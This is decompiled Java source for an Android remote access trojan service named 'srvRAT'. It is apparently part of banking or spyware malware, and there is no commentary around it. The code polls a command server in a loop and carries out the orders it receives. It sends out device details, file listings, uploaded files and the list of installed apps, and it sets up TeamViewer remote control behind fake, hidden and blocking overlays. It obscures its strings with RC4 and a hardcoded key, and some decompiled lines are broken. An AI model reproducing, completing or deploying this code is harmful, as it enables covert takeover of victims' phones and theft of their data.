package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import org.json.*;
import java.io.*;
import android.os.*;
import android.content.pm.*;
import java.util.*;

public class srvRAT extends IntentService
{
    utils after$;
    constants losses$;
    private String learn$;
    private PowerManager$WakeLock alloy$;
    
    public srvRAT() {
        super("");
        this.after$ = new utils();
        this.losses$ = new constants();
        final StringBuilder sb = new StringBuilder();
        sb.append(srvRAT.class.getSimpleName());
        sb.append("   ");
        this.learn$ = sb.toString();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        final String settingsRead = this.after$.SettingsRead((Context)this, "QQ");
        while (true) {
            utils.chalkTile(1000);
            if (this.after$.SettingsRead((Context)this, "RQ").equals("disconnect")) {
                break;
            }
            final JSONObject jsonObject = new JSONObject();
            jsonObject.put("ID", (Object)settingsRead);
            jsonObject.put("screen", (Object)utils._janet((Context)this));
            jsonObject.put("active_app", (Object)this.after$.SettingsRead((Context)this, "RW"));
            jsonObject.put("perm_storage", (Object)utils.hasPermission((Context)this, "android.permission.WRITE_EXTERNAL_STORAGE"));
            final utils after$ = this.after$;
            final utils after$2 = this.after$;
            final StringBuilder sb = new StringBuilder();
            sb.append("q=rat_connect&ws=");
            sb.append(this.after$._grown(jsonObject.toString()));
            final String marina = after$._marina(after$2._brought((Context)this, sb.toString()));
            final String efforts = utils._efforts(new JSONObject(marina).getString("rat_cmd"));
            final utils after$3 = this.after$;
            final String learn$ = this.learn$;
            final StringBuilder sb2 = new StringBuilder();
            sb2.append("rat_cmd_base64_decode: ");
            sb2.append(marina);
            sb2.append(" >>  ");
            sb2.append(efforts);
            after$3.Log(learn$, sb2.toString());
            if (efforts.equals("rat_disconnect")) {
                this.after$.SettingsWrite((Context)this, "RQ", "disconnect");
            }
            else {
                final boolean contains = efforts.contains("open_folder");
                int n = 0;
                if (contains) {
                    String string;
                    if ((string = new JSONObject(efforts).getString("open_folder")).equals("~/")) {
                        Environment.getExternalStorageDirectory();
                        string = null;
                    }
                    final String[] pants = this.after$._pants(null);
                    final JSONObject jsonObject2 = new JSONObject();
                    jsonObject2.put("cmd", (Object)"array_files_folder");
                    jsonObject2.put("dir", (Object)utils._cookie(string));
                    jsonObject2.put("folders", (Object)utils._cookie(pants[0]));
                    jsonObject2.put("files", (Object)utils._cookie(pants[1]));
                    final String replace = jsonObject2.toString().replace("\\n", "");
                    this.after$.Log("JSON_SEND", replace);
                    final utils after$4 = this.after$;
                    final StringBuilder sb3 = new StringBuilder();
                    sb3.append("q=rat_cmd&ws=");
                    sb3.append(this.after$._grown(replace));
                    after$4._brought((Context)this, sb3.toString());
                }
                else if (efforts.contains("uploadind_file")) {
                    final JSONObject jsonObject3 = new JSONObject(efforts);
                    final File file = null;
                    jsonObject3.getString("uploadind_file");
                    final String encodeToString = Base64.encodeToString(utils._update(file), 0);
                    final JSONObject jsonObject4 = new JSONObject();
                    jsonObject4.put("cmd", (Object)"saved_file");
                    jsonObject4.put("ID", (Object)settingsRead);
                    jsonObject4.put("name", (Object)null);
                    jsonObject4.put("file_base64", (Object)encodeToString);
                    final utils after$5 = this.after$;
                    final StringBuilder sb4 = new StringBuilder();
                    sb4.append("q=rat_cmd&ws=");
                    sb4.append(this.after$._grown(jsonObject4.toString()));
                    after$5._brought((Context)this, sb4.toString());
                }
                else if (efforts.contains("get_apps")) {
                    this.after$.Log(this.learn$, "GET APPS 1");
                    final JSONObject jsonObject5 = new JSONObject();
                    final PackageManager packageManager = this.getPackageManager();
                    for (final ApplicationInfo applicationInfo : packageManager.getInstalledApplications(0)) {
                        if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                            jsonObject5.put(String.valueOf(n), (Object)applicationInfo.packageName);
                            ++n;
                        }
                    }
                    final JSONObject jsonObject6 = new JSONObject();
                    jsonObject6.put("cmd", (Object)"saved_apps");
                    jsonObject6.put("apps", (Object)utils._cookie(jsonObject5.toString()));
                    this.after$.Log(this.learn$, "GET APPS 2");
                    final utils after$6 = this.after$;
                    final String learn$2 = this.learn$;
                    final StringBuilder sb5 = new StringBuilder();
                    sb5.append("JSON: ");
                    sb5.append(jsonObject6.toString());
                    after$6.Log(learn$2, sb5.toString());
                    final utils after$7 = this.after$;
                    final StringBuilder sb6 = new StringBuilder();
                    sb6.append("q=rat_cmd&ws=");
                    sb6.append(this.after$._grown(jsonObject6.toString()));
                    after$7._brought((Context)this, sb6.toString());
                }
                else if (efforts.contains("connect_teamviewer")) {
                    final JSONObject jsonObject7 = new JSONObject(efforts);
                    this.after$.SettingsWrite((Context)this, "RT", jsonObject7.getString("connect_teamviewer"));
                    this.after$.SettingsWrite((Context)this, "RY", jsonObject7.getString("password"));
                    this.after$.SettingsWrite((Context)this, "RS", jsonObject7.getString("fake"));
                    this.after$.SettingsWrite((Context)this, "RI", jsonObject7.getString("hidden"));
                    this.after$.SettingsWrite((Context)this, "RA", jsonObject7.getString("blocking"));
                    this.after$._bhutan((Context)this);
                    utils.runApplication((Context)this, "com.teamviewer.host.market");
                }
                else if (efforts.contains("open_teamviewer")) {
                    final JSONObject jsonObject8 = new JSONObject(efforts);
                    this.after$.SettingsWrite((Context)this, "RS", jsonObject8.getString("fake"));
                    this.after$.SettingsWrite((Context)this, "RI", jsonObject8.getString("hidden"));
                    this.after$.SettingsWrite((Context)this, "RA", jsonObject8.getString("blocking"));
                    this.after$._bhutan((Context)this);
                    utils.runApplication((Context)this, "com.teamviewer.host.market");
                }
                else if (efforts.contains("send_settings")) {
                    final JSONObject jsonObject9 = new JSONObject(efforts);
                    this.after$.SettingsWrite((Context)this, "RS", jsonObject9.getString("fake"));
                    this.after$.SettingsWrite((Context)this, "RI", jsonObject9.getString("hidden"));
                    this.after$.SettingsWrite((Context)this, "RA", jsonObject9.getString("blocking"));
                    this.after$._bhutan((Context)this);
                }
                else {
                    if (!efforts.contains("device_unlock")) {
                        continue;
                    }
                    final JSONObject jsonObject10 = new JSONObject(efforts);
                    this.after$.SettingsWrite((Context)this, "RS", jsonObject10.getString("fake"));
                    this.after$.SettingsWrite((Context)this, "RI", jsonObject10.getString("hidden"));
                    this.after$.SettingsWrite((Context)this, "RA", jsonObject10.getString("blocking"));
                    if (this.alloy$ != null) {
                        this.alloy$.release();
                    }
                    (this.alloy$ = ((PowerManager)this.getSystemService("power")).newWakeLock(805306394, this.getClass().getName())).acquire();
                }
            }
        }
        this.stopSelf();
    }
}
